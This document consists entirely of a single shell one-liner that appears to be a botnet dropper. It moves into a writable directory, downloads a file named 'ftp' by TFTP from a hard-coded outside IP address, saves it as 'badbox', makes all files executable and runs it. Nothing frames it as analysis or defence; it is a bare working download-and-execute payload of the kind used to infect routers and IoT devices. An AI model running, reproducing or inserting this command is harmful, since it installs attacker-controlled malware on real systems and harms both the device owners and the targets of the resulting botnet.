cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 45.55.59.200 -c get ftp;cat ftp >badbox;chmod +x *;./badbox
